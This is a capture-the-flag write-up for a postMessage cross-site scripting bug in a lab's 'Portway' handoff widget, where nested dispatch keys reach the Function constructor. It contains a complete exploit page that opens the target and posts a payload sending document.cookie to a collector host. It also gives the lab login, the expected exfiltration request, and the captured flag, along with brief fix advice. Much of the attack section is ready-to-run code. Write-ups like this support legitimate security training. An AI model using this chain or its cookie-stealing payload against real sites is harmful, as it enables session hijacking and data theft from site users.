# Portway postMessage Nested Constructor Gadget XSS

## What Is Happening

The [Portway lab](https://6ef16173de2a.pwnbox-lab.com/) exposes a session-handoff widget at `/embed/handoff`. Partner apps drive it with `postMessage`, and reported partner URLs are opened by a reviewer in a fresh authenticated session.

This variant is not the origin-trust, `targetOrigin` overload, or `window[func]` setTimeout gadgets. Instead, the widget exposes a nested logging dispatcher that attacker-controlled keys can route to `Function`.

## Why It Happens

The live widget contained:

```javascript
const log = {
    error: {
        "general": (data) => {
            return () => console.log("There was an error in submitting the " + ((data.pageName != null)? data.pageName : "drawing") + "!")
        },
        "connection": (data) => { /* ... */ }
    },
    success: {
        "general": (data) => { /* ... */ },
        "close": (data) => { /* ... */ }
    }
};

window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'log') {
        log[event.data.cat][event.data.message_type](event.data)()
    }
});
```

Three issues combine:

1. No `event.origin` validation.
2. Attacker-controlled nested dispatch: `log[cat][message_type](event.data)()`.
3. `cat=constructor` and `message_type=constructor` reach `log.constructor.constructor`, which is `Function`.

Working chain:

```javascript
log['constructor']['constructor'](event.data)()
// Function(event.data)()
```

If `event.data` is an array that survives structured clone, `Function(array)` uses the array's string form as the function body and the trailing `()` executes it.

## Exact Test

Host a partner page that:

1. opens `https://6ef16173de2a.pwnbox-lab.com/embed/handoff` in a popup
2. sends an array payload with `action`, `cat`, and `message_type`

Minimal shape:

```html
<!doctype html>
<meta charset=utf-8>
<body>
<script>
const TARGET = 'https://6ef16173de2a.pwnbox-lab.com/embed/handoff';
const EXFIL = 'https://[collector]';
const w = window.open(TARGET, 'pw');
setTimeout(() => {
  const code = '(new Image).src="' + EXFIL + '/?c="+encodeURIComponent(document.cookie)';
  const p = [code];
  p.action = 'log';
  p.cat = 'constructor';
  p.message_type = 'constructor';
  w.postMessage(p, '*');
}, 2000);
</script>
```

Report the partner URL through `POST /report` after logging in as `demo / demo123`.

## Expected Signal

- Local iframe tests may fail to leak cookies because of third-party cookie restrictions.
- In the reviewer flow, the collector should receive a callback from the Portway origin.
- A successful hit includes the reviewer's flag cookie:

```text
GET /?c=flag=pwnbox{...}
Referer: https://6ef16173de2a.pwnbox-lab.com/
```

## Result Interpretation

Confirmed bug chain:

```text
attacker partner page
-> popup /embed/handoff
-> postMessage({ action:'log', cat:'constructor', message_type:'constructor', 0:'...code...' })
-> log.constructor.constructor(arrayPayload)()
-> XSS in Portway origin
-> exfil document.cookie
```

## Root Cause

The SDK treated partner `postMessage` data as routing input for nested object dispatch without origin checks or key allowlisting.

## Impact

- XSS in the provider origin
- theft of reviewer session state or lab flag cookie
- likely partner-integration compromise in real deployments with similar debug logging bridges

## Fix

- Allowlist `cat` and `message_type` to known static keys
- validate `event.origin`
- never route user input through `obj[userKey][userSubKey]()`
- remove debug logging bridges from production embeds

## Flag

`pwnbox{aafd360284d489acb919b0ae7401324c}`
